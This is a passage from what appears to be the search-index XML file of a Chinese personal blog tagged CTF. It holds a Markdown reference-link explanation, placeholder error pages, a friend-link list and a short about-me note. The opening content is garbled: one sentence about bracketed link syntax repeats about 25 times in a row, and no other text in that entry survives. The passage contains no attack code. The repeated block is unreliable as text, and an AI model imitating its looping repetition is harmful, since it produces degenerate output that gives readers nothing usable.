表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。可以发现，引用式链接在正文中使用了两个方括号，第一个方括号包裹超链接的文本部分，也就是这里的 <code>[an example]</code>，紧接着其后的是一个可有可无的空格，接下来使用第二个方括号包裹该链接的标识符，这里用 <code>[id]</code> 表示。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>jesen</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<html>  <head></head>  <body>对不起,目前无法访问你的连接,你可以访问主页    </body></html>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<html>  <head></head>  <body>对不起,目前无法访问你的连接,你可以访问主页    </body></html>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>标签</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>友情链接</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<html>  <style>  .markdown {    word-wrap: break-word;    font-size: 15px;}  </style>  <div class="markdown">                        <p>欢迎申请友情链接，按照以下格式提交评论即可</p><blockquote><p>名称：Jesen's Blog<br>网址：<a href="https://jesen.ddwhm.com/" target="_blank">https://jesen.ddwhm.com/</a><br>描述：I want to be a great ctfer.</p></blockquote><p><br>申请前请先添加本站对友链，如果贵站没有添加本站的友链，那自然本站也不会添加贵站的友链！</p>                    </div>  <ul>    <li><h3><a href="https://www.bugku.com">Bugku</a></h3></li>    <li><h3><a href="https://yml-sec.top/">yemoli</a></h3></li>    <li><h3><a href="https://www.194nb.com/">Aman</a></h3></li>  </ul>  <br>  <br>  <br>  <br></html>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>分类</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>关于本人</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>hello~~ 开这个博客初衷是为了分享经验记录难忘经历，偶尔输出一下自己的happy/emo。</p>]]></content>
    
  </entry>
  
  
  
</search>
